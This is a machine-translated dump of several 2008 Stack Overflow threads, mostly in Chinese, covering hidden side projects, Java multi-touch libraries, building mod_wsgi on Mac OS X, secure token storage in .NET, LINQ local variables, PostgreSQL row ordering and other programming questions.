因为喜欢编写代码并让我的生活更轻松 - 所以不需要直接资金。除非管理层计划有一个秘密项目，否则我看不出这会是怎样的。

**你是怎么安排的？**

作为一个孤独的开发者，我用笔记本电脑独自在草地上编写代码。

**与地上项目相比，完成需要多长时间？**

没有可比性。我的 skunksworks 努力可能是修修补补的一年。如果我们直接开始做，我无法想象直接用不到 2 个月的时间，但我不知道，因为它不是如何演变的。与前期直接计划相比，思考和计划的停机时间最终可能使其更快。

**与地上项目相比，成本是多少？**

未确定 - 正如我所提到的，鉴于我有时间思考和计划，它能够朝着我想要的方向发展，而没有日程/结果压力。在一个较短或更多资源的项目中，我们可能会在匆忙中犯一些错误以到达一些 M1、M2 等。此外，如果它没有成功，它会好像它从未发生过，因为我可以折叠起来帐篷，悄悄地进入了夜色。

**被正式采纳了吗？**

我的项目是我工作中产品构建的关键部分，所以我会说它是根深蒂固的。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-12-15T19:53:40.417

嗯...我今天实际上做了其中之一。

我们没有真正的备份系统。目前，我得到了一项非常令人愉快的任务，即使用 svn hotcopy 和 .tar.gz 文件备份 100GB 的 SVN 存储库，同时尝试在有限磁盘空间的两个或三个 NFS 共享上处理它们，以便使用备份磁盘到达服务器。这是最好的情况 - 即当我可以费心照顾这个过程 2 小时时。

因为这迟早会以灾难告终，所以我`git svn clone`直接在备份服务器上做了最大的一个，然后将它克隆到我自己的机器上并踢出我正在使用的 svn 工作副本。我在我的机器上获得了大约 1GB 的可用空间，给最重要的备份一些冗余，并将 15 分钟减少`svn st`到 30 秒`git status`。我会因此受到抱怨吗？大概...

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-12-17T09:32:03.743

一般来说，这里的答案都是成功的故事，所以我想我会分享我最近坐在这样一个不太顺利的项目之外的经历。

**你是如何资助它的？** **你是怎么安排的？**

当我的经理确定了一名潜在员工时，该项目就开始了，我们称他为 Fred，他在我们的领域有一个宠物项目。我们的薪水不高，他们同意 Fred 将被聘用并几乎全职从事该项目，他们最终将把该项目介绍给公司。

所以 Fred 开始着手这个项目，只有 Fred 的团队知道，管理层或其他业务部门不知道。Fred 是一名开发人员，这项工作或多或少是纯粹的开发，以及对底层开源项目的贡献。

**成功了吗？**

并不真地。Fred 一个人在做这件事，我想他会花 12 到 18 个月的时间。提交给团队的进度报告包括描述他那周修复的任何错误。偶尔会尝试让组织中的一两个高层感兴趣，但他们从未真正去任何地方。Fred 应该制定一个计划来完成和推出该项目，以便将其介绍给组织，但似乎总是有某种原因从未完成。

**你被发现了吗？**

当弗雷德和经理试图让更多人对他们正在做的事情感兴趣时，这个词慢慢地被过滤掉了。

最终我们进行了重组，我们的新主管想知道每个人都在做什么，这个项目被透露给了他。然而，显然没有很好地解释，因为新导演最后问我（我相信我们团队中的其他人）弗雷德的项目到底是什么？

**你受到惩罚或奖励了吗？**

最终，新主任冻结了该项目的所有资金，弗雷德被重新分配到其他项目工作。据我所知，这是目前的状态。

**与地上项目相比，完成需要多长时间？** **被正式采纳了吗？**

它没有完成，也没有被采纳。

**与地上项目相比，成本是多少？**

表面上的成本是弗雷德的时间。

但是，还有其他费用。

首先，Fred 和他的项目在我们的团队中成了一个笑话，后来在我们合作的团队中也成为了一个笑话。他在做什么？他为什么要这么做？为什么没有进展？弗雷德的名声受损。“弗雷德的项目”成了一个无处可去的项目的笑话。

其次，这样一个长期运行但隐藏的项目的最终曝光对我们的经理产生了不良影响，进而影响到我们整个团队。

三是怨气增加。当有这么多真正的工作要做的时候，这个人为什么要从事他的宠物项目？我们是一个小而忙碌的团队，我们可以在任何数量的其他项目中使用开发人员。

最后，我认为这个项目对我们团队的地位和活力产生了影响。当我们不在办公室时，我偶尔会和团队成员讨论一下。最初（和当时）我们非常批评弗雷德，他可能是一个令人讨厌的人，他不善于接受批评，并且承诺了他无法兑现的事情。最近，我们一直在批评我们的老板。这不是运行项目的好方法，而且很明显，弗雷德从一开始就没有能力独自完成这项工作，他也不会寻求或接受建议。弗雷德被安排在那个位置上并在这个位置上呆了这么久，这对弗雷德来说是不公平的。最近我想知道我是否应该更有力地提出我的担忧。虽然我们确实推动了 Fred 和我们的经理关于项目的内容和进展，我们没有比我们的团队更进一步。话虽如此，即使我们有，我也无法想象会有好的结果。

最后，我想说 Fred 是个聪明人，这个项目也不错。它本来可以成功的（有些部分已经出现在竞争项目中——实际交付的劣势竞争对手）。

如果这个项目是光明正大地完成的，并且 Fred 一直在与一位体面的项目经理合作，并且在团队中有一个很好的沟通者，那么它很可能会找到一个冠军并交付一些很棒的东西。要么就是这样，要么它本可以更早地被杀死。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-12-15T20:22:09.160

我做了其中之一。这实际上是我最终编程的方式。

我负责维护一个遗留的，呃……“数据库”。我不会深入细节，但这是通常的邪恶应用程序。该公司几乎一直在运行它，有时它会宕机数天。当时，IS 主管（朋友）正在积极寻找替代人选，与大型咨询机构交谈等。但管理层在现有系统中投入/情感投入。我自愿（向 IS 主管）尝试重写 is（好吧，更像是他问是否有人有兴趣尝试处理这个烂摊子，我自愿是因为我很无聊）。我们的员工没有真正的程序员，我只写了一些小的临时东西。我不知道我知道多少。

在大约 8 个月或一年内完成了这件事（这是不久前的事情，不记得具体了）。

**成功了吗？** 是的，像宣传的那样工作。

**你被发现了吗？** 它最初是作为一种超级秘密、斗篷和匕首的东西开始的。回想起来有点傻，但它使它更有趣。大约进行到一半时，我开始变得更加明显，那就是我正在做的事情，结果证明这个想法得到了支持。写这个东西最终成了我的工作。

**你受到惩罚或奖励了吗？** 奖励

**你是如何资助它的？/ 你是如何工作的？** 它的成功很大程度上归功于我老板的支持，他确保我有时间和资源去做这件事。

**被正式采纳了吗？** 是的，我们最终经营公司。

# java - 如何用 Java 开发多点触控应用程序？

> ID：369301
> 
> 赞同：19
> 
> 时间：2008-12-15T18:38:45.733
> 
> 标签：java, touch, multi-touch

期待多点触控界面变得更加普及的那一天，Java 中是否有可用于开发触控应用程序的库？我正在寻找类似于 MouseListener / MouseMotionListener / MouseWheelListener 的接口。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-09-06T12:56:55.017

MT4j 项目拥有在 Java 中开发多点触控应用程序所需的一切。所有众所周知的多点触控手势都已内置并且可以像监听鼠标事件一样简单地访问（例如：component.addGestureListener(..)）。它还具有类似于 JavaFX 的硬件加速场景图。您甚至可以通过将一个或多个鼠标连接到您的机器来模拟多点触控输入。查看[http://www.mt4j.org](http://www.mt4j.org)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-12-15T19:10:08.587

[上次我研究多点触控 Java 解决方案时， Sparsh](http://code.google.com/p/sparsh-ui/)仍在我的书签中。

虽然不像典型的鼠标监听器或点击监听器那样直接，但它仍然提供了一个合理的界面。

你需要你的监听类来实现`sparshui.client.Client`，这需要`processEvent`方法定义。

```
public void processEvent(int groupID, Event event) {

        if(event instanceof TouchEvent) {
            TouchEvent e = (TouchEvent)event;
            if(e.getState() == TouchState.BIRTH) {
                //do initial touch stuff
            } else if(e.getState() == TouchState.MOVE) {
                //do dragging stuff
            }
        }
        else if(event instanceof DragEvent) {
            DragEvent e = (DragEvent)event;
            //do DragEvent specific stuff
        } else if(event instanceof RotateEvent) {
            RotateEvent e = (RotateEvent)event;
            //do RotateEvent specific stuff
        } else if(event instanceof ZoomEvent) {
            ZoomEvent e = (ZoomEvent)event;
            //do ZoomEvent specific stuff
        }
        //several other gesture types....
} 
```

之后，你需要启动手势识别服务器，传入你的组件

```
new ServerConnection("localhost", objectImplementingClientInterface); 
```

查看网站上的代码示例应该可以让您对框架有一个很好的了解。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-08-20T16:59:24.010

这个怎么样：http: [//kenai.com/projects/macmultitouch](http://kenai.com/projects/macmultitouch)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-04-29T21:09:12.357

我主要从事从头开始处理和设计我的 UI 的工作。我一直在寻找一种不规定 MT4J 和 JavaFX 似乎都可以使用的 UI 框架的解决方案。此外，MT4J 似乎已被放弃。

这看起来至少对于 Windows 来说是一个很有前途的解决方案，但我不确定它是否真的发布了： [http ://wiki.gestureworks.com/index.php/GestureWorksCore:Gestureworks_Core_Tutorials](http://wiki.gestureworks.com/index.php/GestureWorksCore%3aGestureworks_Core_Tutorials)

这专门用于处理、跨平台、开源和活跃： [https ://github.com/vialab/SMT](https://github.com/vialab/SMT)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-07-30T11:08:21.170

**MT4J**不适用于 Windows 8。

如果应用程序仅适用于一个用户，您可以使用**JavaFX**。触摸事件有不同的侦听器。但是不可能同时处理两个手势，因为所有的触摸点都会合并为一个手势。对于大型多点触摸屏来说，这是一个缺点。对于普通屏幕，只有一个用户可以。

但也有**GestureWorks**。您可以在那里定义新手势或使用预定义的手势。手势在 XML 文件（称为 GML）中定义。任何对象都可以处理自己的手势。但是您必须手动实现 hitTest 和点分配。但是有一个[很棒的教程](http://wiki.gestureworks.com/index.php/GestureWorksCore:Gestureworks_Core_Tutorials)。

另一个我没有测试过的库[是 PQ Lab 的 Multi Touch SDK](http://multitouch.com/sdk-pq-windows.html)。

# python - Is there anyone who has managed to compile mod_wsgi for apache on Mac OS X Leopard?

> ID：369305
> 
> 赞同：4
> 
> 时间：2008-12-15T18:39:13.640
> 
> 标签：python, django, apache

I'm working on a Django project that requires debugging on a multithreaded server. I've found mod_wsgi 2.0+ to be the easiest to work with, because of easy workarounds for python module reloading. Problem is can't get it to compile on Leopard. Is there anyone who has managed to do it so far, either for the builtin Apache or MAMP. I'd be grateful if someone posts a link to a precompiled binary (for intel, python 2.5, apache 2.2 or 2.0).

* * *

After 3 hours of trial and error I've managed to compile mod_wsgi 2.3 for the Apache that comes with Leopard. Here are the instructions in case anyone else needs this.

1.  ./configure
2.  Change 2 lines in the Makefile

    CFLAGS = -Wc,'-arch i386'

    LDFLAGS = -arch i386 -Wl,-F/Library/Frameworks -framework Python -u _PyMac_Error

3.  make && sudo make install

4.  Make a thin binary of the original httpd

    cd /usr/sbin

    sudo mv ./httpd ./httpd.fat

    sudo lipo ./httpd.fat -thin i386 -output ./httpd.i386

    sudo ln -s ./httpd.i386 ./httpd

This should work on intel macbook, macbook pro, imac and mac mini. As I understood the problem is modwsgi won't compile against MacPython 2.5.2 because of some weird architecture missmatch problem. But, if you compile it as a thin binary it won't play with the Apache fat binary. So this hack solves the problem. The rest is pretty standard configuration, like on any other platform.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-25T16:34:18.737

这并不能直接回答您的问题，但是您是否考虑过使用 MacPorts 之类的东西来做这类事情？如果你正在编译很多这样的软件，MacPorts 真的可以让你的生活更轻松，因为构建软件和依赖项实际上是自动的。

# .net - 使用 .NET 安全存储身份验证令牌

> ID：369312
> 
> 赞同：5
> 
> 时间：2008-12-15T18:41:18.490
> 
> 标签：.net, security, encryption

我目前正在开发调用第三方 API 的桌面应用程序。在对他们的“网络服务”进行授权后，会返回一种用户令牌，该令牌应该存储在本地（即使用户关闭应用程序）。

所以我正在寻找用用户特定密钥加密这个令牌的解决方案。Windows（和.NET）是否提供了一些标准方法来做到这一点？我想要的只是保护令牌免受同一台计算机的其他用户的影响。

PS我不能存储哈希，因为我需要在启动时解密这个令牌。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-15T18:47:48.587

是的。Windows 确实提供了它。查看可由 .NET Framework 的类（自 v2.0 起可用）访问的[DPAPI ，以安全地存储敏感信息。](http://en.wikipedia.org/wiki/Data_protection_API)`System.Security.Cryptography.ProtectedData`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-15T18:45:18.327

是的，.NET 中有许多用于加密的内置函数，这完全取决于您希望如何完成它。

这是一篇[很好的入门文章](http://www.vbdotnetheaven.com/UploadFile/gsparamasivam/cryp04112005063256AM/cryp.aspx)，向您展示了在 .NET 中进行加密的一些基本元素、类和方法

注意：所有需要的类都在 System.Security.Cryptography 命名空间中

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-15T18:46:45.263

在运行时，您可以将身份验证密钥存储在[SecureString](http://msdn.microsoft.com/en-us/library/system.security.securestring.aspx) ... 中以将其存储在会话之间，您可以使用.NET 框架中的[对称加密API 之一。](http://msdn.microsoft.com/en-us/library/system.security.cryptography.symmetricalgorithm.aspx)

# sql - SQL 舍入问题

> ID：369331
> 
> 赞同：0
> 
> 时间：2008-12-15T18:48:03.703
> 
> 标签：sql, rounding

我在一列中返回以下值.. 0.250000 和 13.000000。我想将 0.250000 向上舍入到 1 并保持 13 不变。有什么简单的方法可以做到这一点，因为它们都属于同一列？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-15T18:50:02.997

您的 DBMS 可能具有 CEILING 功能。试试看。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-15T18:53:58.370

天花板函数会很好地工作，因为您想四舍五入到最接近的整数。有关使用 SQL Server 舍入的更多方法......

[SQL Server 舍入方法](http://blogs.lessthandot.com/index.php/DataMgmt/DataDesign/sql-server-rounding-methods)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-15T18:50:36.660

从表名中选择 CEILING( 列名 )

# c# - C#：是否可以在匿名方法中声明局部变量？

> ID：369334
> 
> 赞同：13
> 
> 时间：2008-12-15T18:50:10.530
> 
> 标签：c#, linq-to-sql, lambda, anonymous-methods

是否可以在匿名 c# 方法中有一个局部变量，即在下面的代码中我只想执行一次计数。

```
IQueryable<Enquiry> linq = db.Enquiries;

if(...) linq = linq.Where(...);

if(...) linq = linq.Where(e => 
    (x <= (from p in db.Orders where p.EnquiryId == e.Id select p).Count() && 
        (from p in db.Orders where p.EnquiryId == e.Id select p).Count() <= y));

if(...) linq = linq.Where(...);

var result = (from e in linq select e); 
```

匿名函数是否有“让”？

更新：请注意，我在此语句之后添加了几个 Where 子句，因此我无法通过选择关闭。

/尼尔斯

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2008-12-15T18:51:59.077

是的，为什么不？！毕竟它是一个函数，只是匿名的！

例子：

```
 x => { int y = x + 1; return x + y; } 
```

或者：

```
 delegate(int x) {
     int y = x + 1;
     return x + y;
 } 
```

所以你的代码可以写成：

```
 ... = linq.Where(e => {
         var count = (from p in db.Orders where p.EnquiryId == e.Id select p).Count();
         return x <= count && count <= y;
  }); 
```

更新：为了澄清有关评论的内容，了解匿名方法和 lambda 表达式之间的区别很重要。匿名方法就像普通方法一样，没有明确的名称。当您编译它时，编译器会为您生成一个带有奇怪名称的普通方法，因此它不会有任何特殊限制。但是，匿名方法的一种表示是 lambda 表达式。Lambda 表达式可以用几种不同的方式来解释。第一个是代表。这样，它们就等于匿名方法。第二个是表达式树。LINQ to SQL 和其他一些 LINQ 提供程序通常使用这种方式。他们不会以任何方式直接执行您的表达式。他们将其解析为表达式树，并使用该树作为输入数据来生成要在服务器上运行的等效 SQL 语句。它不像方法那样执行，也不被视为匿名方法。在这种情况下，您无法定义局部变量，因为无法将 lambda 解析为表达式树。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-12-15T19:10:28.523

是的，你可以在 Linq to objects 和 Linq to SQL 中做你想做的事。

Linq 中有一个`let`，允许您在查询中间为中间结果命名，就像您想要的那样。根据您的示例：

```
... = from e in linq 
      let count = (from p in db.Orders where p.EnquiryId == e.Id select p).Count()
      where (x <= count) && (count <= y)
      select e; 
```

顺便说一句，我认为您的原始示例在语法上存在一些错误，当 the`count`只是一个名称时更容易发现：

```
where (x <= count) && /* <= */ (count <= y); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-15T19:01:40.117

如果您使用的是 Linq to SQL，您将无法使用 Mehrdad Afshari 的答案。您的 LINQ 表达式需要是表达式树，并且不支持匿名委托语法。

您也不能在其他地方创建您的委托并从 lambda 内部调用它 - Linq to SQL 只允许在查询主体中执行某些操作，而调用委托不是其中之一。

假设您使用的是 Linq to SQL（如您的示例所示），您最好的选择是在一个查询中降低计数，然后在需要计数的查询中捕获计数变量。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-15T18:57:31.500

Where 方法采用 Func，因此您在第二部分中传递的内容实际上并不是一个方法，而只是一个布尔表达式。我的建议是有一个返回布尔值的实际方法，它接受你需要的参数，在你调用 Where 方法时，你只需执行类似 Where(p=> MyMethod(p,...)) 的操作

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-16T08:32:23.443

稍微了解一下 Scheme 的背景知识，您就会知道 'let' 只是用于定义 lambda 并调用它的语法糖。

因此，有了这些知识，让我们看看如何做到这一点。

```
(count => x <= count && count <= y)
  ((from p in db.Orders 
    where p.EnquiryId == e.Id 
    select p).Count()) 
```

作为奖励，它看起来也像 Scheme :)

免责声明：我没有测试这个片段，但没有理由它不应该工作。就个人而言，我只会使用 LINQ 中提供的“让”构造。

**更新：**

这没用... ：（

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-23T23:26:00.043

我遇到了类似的问题。解决方案是创建自定义表达式树生成方法。

我在 MSDN 论坛上问了我的问题。请在此处查看问题和答案：[重用 Where 表达式](http://social.msdn.microsoft.com/forums/en-US/linqtosql/thread/7256f2a6-71e2-40f5-9235-1bf71032f8b6/ "重用 Where 表达式")。

这可能会让您知道如何进行，但我必须承认自定义表达式树不适合胆小的人;-)

# java - Java 图标常量 - 静态常量可以吗？

> ID：369348
> 
> 赞同：5
> 
> 时间：2008-12-15T18:55:16.620
> 
> 标签：java, icons, constants

我在整个应用程序中使用了许多图标 - 让我们以确定/取消图标为例。目前它们可能是一个勾号和一个十字（tick.png，cross.png），但我将来可能想替换它们。另外，我想将资源路径保留在一个地方。

这个可以吗：

```
public class Icons {
    public static Icon OK = new ImageIcon(Icons.class.getResource("/icons/tick.png");
    public static Icon CANCEL = new ImageIcon(Icons.class.getResource("/icons/cross.png");
} 
```

还是我应该以不同的方式做这件事？我不介意在运行时依赖图像文件的存在，因为它们在 .jar 中

**解决方案**

我已经使用 Bent 的想法进行初始化，并且我已经将常量设为 final：

```
public final class Icons {
    private static final Logger logger = Logger.getLogger(Icons.class);

    public static final Icon OK = icon("/icons/add.png");
    public static final Icon CANCEL = icon("/icons/cancel.png");

    private static Icon icon(String path) {
        URL resource = Icons.class.getResource(path);
        if(resource==null) {
            logger.error("Resource "+path+" does not exist");
            return new ImageIcon();
        }
        return new ImageIcon(resource);
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-15T19:00:00.120

我看到两个问题，两者都可以接受：

1.  如果找不到或由于某些原因无法加载图标，将很难调试。在静态初始化程序中运行的代码可能很棘手，因为很容易“释放”异常。
2.  该类可能永远不会被卸载，因此图标使用的资源永远不会被释放。

如果您可以确保图标始终存在并且甚至可以通过将初始化放在静态初始化程序块中并添加良好的异常处理和日志记录来解决，那么数字 1 可能是可以接受的。

数字 2 可能是可以接受的，因为图标通常会在应用程序的整个运行时使用，并且在应用程序退出之前它们不会被释放很长时间。

所以总而言之，我会说这很好。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-15T18:57:12.670

您可能希望将常量标记为 final。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-15T19:06:08.033

如果您想将图标保留为静态常量，我会将 ImageIcon 对象的实例化提取到静态方法中；

```
public static final Icon ok = icon("ok.png");

private static Icon icon(String path) {

    URL resource = Icons.class.getResource("/icons/" + path);
    if (resource == null) {
        // Log something...
        return null;
    }
    return new ImageIcon(resource);
} 
```

这样，无论何时发生故障，您都可以进行控制，并且您不必在实例化中重复自己。

另外，我会将常量设为最终值。

更通用的方法可能是使用反射来检查您的 Icons 类并为类中的每个公共静态 Icon 字段加载资源。这样，您只需要声明一个新的 Icon 常量，相应的资源就会根据常量的名称自动加载。如果您想获得更多关于此操作的提示，请发表评论。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-15T18:58:08.923

这似乎是一种相当简单的方法。虽然我会用与它们的名称相同的名称来命名图像（“ok.png”，“cancel.png”）。并确保清楚删除或重命名图像可能会导致问题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-15T19:11:07.510

这似乎是做事的标准方式，但我以前遇到过问题。

如果您将 Eclipse 与 Maven 一起使用并将这些图标存储在 Maven 的资源目录中，那么当 Eclipse 执行其自动构建之一时，它不会将图标文件复制到您的目标/类目录中。当找不到图标时，这将导致运行时异常。

您必须至少手动执行一次 maven 包才能将图标放在正确的位置。

# oracle - MS-Access 链接表中的过滤表列表？

> ID：369356
> 
> 赞同：0
> 
> 时间：2008-12-15T18:58:43.073
> 
> 标签：oracle, ms-access, odbc

WinXP Pro Oracle 10g Instant Client 10.2.0.1 MS Access 2003

当我在 MS Access 中链接一个表时，出现的选择列表会显示我可以访问的系统中的每个表和视图。这个列表相当大。通常，我真的只想看看我拥有的表。有没有办法根据所有者或任何其他条件过滤显示的项目？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-15T20:24:49.153

并不真地。

您可以通过设置另一个帐户来解决它，该帐户只能访问您的表格并以这种方式链接它们。当您对创建的链接感到满意时，您可以随时在链接表管理器中更新链接（链接到新位置，也许指向您的帐户）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-15T21:01:53.620

您可以在远程数据库中创建您“拥有”的对象（表和视图）的本地表。然后，您可以编写一些 VBA 代码，通过在此表上循环并使用 doCmd.TransferDatabase 方法，您可以自动生成链接。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-06-23T18:32:46.493

是的，您可以在您的 ODBC 连接中设置一个 SCHEMALIST 参数（在高级设置选项卡下），并指定您想要包含在表链接列表中的表模式。然后，这将只带回您在 SCHEMALIST 中列出的表。

# winapi - DLGTEMPLATE 到 CWnd 派生的控制

> ID：369358
> 
> 赞同：0
> 
> 时间：2008-12-15T18:59:46.160
> 
> 标签：winapi, mfc, cwnd

是否可以使用 DLGTEMPLATE 并将其用作 CWnd 派生控件以放置在任何其他 CWnd 中？

我有一个要在我的 CDockablePanes 之一上使用的对话框模板

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-19T15:11:56.690

你的问题不清楚，请改写。如果您询问是否可以从 DLGTEMPLATE 实例化控件并将该实例化放在另一个对话框中或作为另一个控件的子控件，那么可以。这是一个主要的 PITA，如果您想了解详细信息，请阅读旧新事物博客（对话模板系列）。如果您只是想让它工作，请使用 MSDN 示例之一中的 CDlgTempl 类；从这里开始：http: [//support.microsoft.com/kb/155257](http://support.microsoft.com/kb/155257)。它不会制作 CWnd 派生控件，但如果您问我认为您是什么，它们不是您想要的；你会得到一个 CDialog 派生的对象（它本身显然是从 CWnd 派生的，所以从这个意义上说，它确实给了你所要求的）。

# postgresql - PostgreSQL 更改返回的行顺序

> ID：369362
> 
> 赞同：6
> 
> 时间：2008-12-15T19:00:55.813
> 
> 标签：postgresql

我有一个名为 categories 的表，其中包含 ID(long)、Name(varchar(50))、parentID(long) 和 shownByDefault(boolean) 列。

该表包含 554 条记录。所有显示的默认值都是“假”。
当我执行“select id, name from categories”时，pg 返回所有类别，orderer 按其 id。
然后我更新了表的一些行（'update categories set shownByDefault where parentId = 1'），更新OK。
然后，当我尝试执行返回所有类别的第一个查询时，它们是以非常奇怪的顺序返回的。
我添加“order by”没有问题，但由于我使用 JPA 来获取这些值，所以任何人都知道问题是什么，或者是否有办法解决这个问题？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2008-12-15T19:03:47.883

这不是问题。SQL SELECT 返回的行的顺序是未定义的，除非它有一个`ORDER BY`. 您获得它们的顺序通常受它们存储在表中的顺序和/或语句使用的索引的影响。

因此，在不使用的情况下依赖该订单`ORDER BY`是一个非常非常糟糕的主意。

如果您按某种顺序需要它们，只需指定即可。

重要的是，表是一[组](http://en.wikipedia.org/wiki/Set_(mathematics))行而不是行[序列](http://en.wikipedia.org/wiki/Sequence)。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-12-15T19:05:10.033

从[文档](http://www.postgresql.org/docs/current/interactive/sql-select.html)：

> 如果指定了 ORDER BY 子句，则返回的行按指定的顺序排序。如果未给出 ORDER BY，则以系统发现最快生成的任何顺序返回行。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-15T19:18:16.620

行以它们在磁盘上的物理顺序返回；您可以使用`CLUSTER`SQL 命令对它们进行物理重新排序，但是由于 Postgres 的工作方式，一旦您开始修改行，它们就会变得无序。

因为你正在做的`ORDER BY`是正确的答案。

# windows-ce - 如何从 WinCE 上的用户模式代码访问 ARM CPU 中的高速 SRAM？

> ID：369363
> 
> 赞同：2
> 
> 时间：2008-12-15T19:00:57.967
> 
> 标签：windows-ce, arm

在编写嵌入式 ARM 代码时，可以轻松访问内置的零等待状态存储器来加速您的应用程序。Windows CE 不向用户模式应用程序公开这一点，但可能有办法做到这一点。内部 SRAM 通常用于视频缓冲区，但通常还有一些剩余。有人知道该怎么做吗？

谢谢，拉里 B。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-06T17:51:13.127

不幸的是，您无法从用户模式进程访问高速内存。

在 WindowsCE-OS 上访问它的唯一方法是编写驱动程序，将 TCM 的固定地址映射到用户模式进程地址空间并将其传递给用户模式进程。

# c# - 通过 C# 在运行时编译 swf？

> ID：369364
> 
> 赞同：3
> 
> 时间：2008-12-15T19:01:08.667
> 
> 标签：c#, apache-flex, flash

我想知道是否可以通过 C# 在运行时编译 .swf 文件（将通过 Flex 应用程序调用）。我读过一些关于使用 fsch.exe 的文章，但没有给出任何具体的例子。

我相当肯定这是可能的，所以第二个问题是它在中等规模上是否可行。我希望允许用户配置一个 swf，然后将这些设置直接编译到 swf 中以进行交付，而不是依赖外部数据存储来保存配置详细信息。

提前感谢您提供的任何帮助 -

账单

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-16T04:52:54.353

您应该能够使用命令行编译器相当简单地做到这一点。

您需要能够在服务器上设置编译器。[http://www.google.com.au/search?hl=en&q=swf+command+line+compiler&btnG=Search&meta=](http://www.google.com.au/search?hl=en&q=swf+command+line+compiler&btnG=Search&meta=)

然后，在您的 C# 代码中，您可以执行一个 shell 命令来调用您的编译器。[http://www.google.com.au/search?hl=en&q=execute+command+shell+asp+.net&btnG=Search&meta=](http://www.google.com.au/search?hl=en&q=execute+command+shell+asp+.net&btnG=Search&meta=)

需要注意的一件事是在尝试检索已编译文件之前等待编译器完成。您将需要处理来自编译器的响应并确保编译成功。

我不明白为什么这在中等规模上是不可行的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-16T04:56:39.153

您可以尝试[MTASC](http://www.mtasc.org/) .. 它是基于命令行的 ActionScript 编译器，因此您可以使用[Process.Start](http://msdn.microsoft.com/en-us/library/system.diagnostics.process.start.aspx)调用它，然后使用[Process.WaitForExit](http://msdn.microsoft.com/en-us/library/system.diagnostics.process.waitforexit.aspx)方法等待它完成编译

# prototypejs - 原型框架/从按钮调用

> ID：369367
> 
> 赞同：0
> 
> 时间：2008-12-15T19:02:28.790
> 
> 标签：prototypejs

我认为这很简单，但我没有得到与我阅读的教程相同的结果。我在 html 页面上有一个按钮，它调用脚本标签中的函数。我还参考了prototype.js 文件，我什至还没有开始实现它。如果我将该引用保留在页面中，则我的函数调用无法从按钮的 onclick 事件中进行。下面是从按钮 onclick 事件中调用的内容。

```
callIt = function(){

alert('It worked!');
}

</script> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-15T19:15:43.787

有几件事：首先，确保您的 HTML 是有效的。[通过http://validator.wc.org](http://validator.wc.org)上的验证器运行它。

接下来，一旦你确定你的页面是有效的，添加prototype.js 库作为页面上的第一个脚本引用：

```
<script type="text/javascript" src="prototype.js"></script> 
```

请注意，我没有像这样关闭它`<script ... />`Script blocks need to have an explicit closing tag (至少在 XHTML 1.0 Transitional 中)

现在，要回答您的问题，我真的不确定您要问什么，但是如果您想使用 Prototype 将 callIt 方法附​​加到按钮的 onclick 处理程序，请执行以下操作：

```
Event.observe(window, 'load', function() {
    Event.observe('button_id', 'click', callIt);  
}); 
```

将其放在页面元素中的脚本标记中，原型脚本引用下方。这将在加载 DOM 并且页面上存在按钮时执行。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-15T19:26:30.147

那行得通。我只是很困惑为什么我一直在研究的例子都没有做到这一点。

谢谢！

# process - 我们应该跟踪代码以外的东西的缺陷吗？

> ID：369377
> 
> 赞同：6
> 
> 时间：2008-12-15T19:05:27.567
> 
> 标签：process, bug-tracking

在我职业生涯的不同时期，我鼓励与我一起工作的员工和/或设法跟踪除源代码之外的开发过程工件中的缺陷（即需求、测试、设计）。每次请求都遭到惊讶、困惑和抵制。这对我来说似乎很明显，当人们拒绝这个想法时，我总是有点震惊。

我们从这个练习中得到的是一张关于在哪里创建错误以及在哪里找到错误的图片（在流程的哪个部分）。如果我们正在构建不好的需求，那么我们就会知道并可以努力改进它们。

是否还有其他人收集有关源代码中缺陷的信息？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-12-15T19:08:13.473

是的，跟踪他们。

文档、设计文档、要求等。

当我听到反对它的“论据”时，我也和你一样感到惊讶。
至少跟踪系统应该能够识别缺陷的发现位置以及注入过程的哪个部分。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-15T19:16:54.940

绝对地。看看[Ubuntu Bug #1](https://bugs.launchpad.net/ubuntu/+bug/1)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-15T19:08:28.963

当然是。围绕代码的工件——模型、规范、文档、需求信息、用例等——都可能包含影响代码本身的错误。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-15T19:10:02.503

